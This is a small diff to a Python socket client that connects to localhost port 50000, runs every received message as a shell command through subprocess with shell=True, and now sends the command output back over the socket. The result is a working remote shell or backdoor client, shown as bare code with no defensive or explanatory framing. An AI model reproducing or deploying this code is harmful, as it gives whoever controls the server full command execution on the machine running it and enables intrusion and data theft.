@@ -1,6 +1,6 @@
 import socket
 import threading
-from os import system
+import subprocess
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect(('localhost', 50000))
@@ -11,9 +11,11 @@ client.connect(('localhost', 50000))
 def action():
     try:  
         message = client.recv(1024).decode('utf-8')
-        system(message)
+        output = subprocess.check_output(message, shell=True)
+        client.send(output)
 
-    except:
+    except Exception as e:
+        print(e)
         pass
         
 
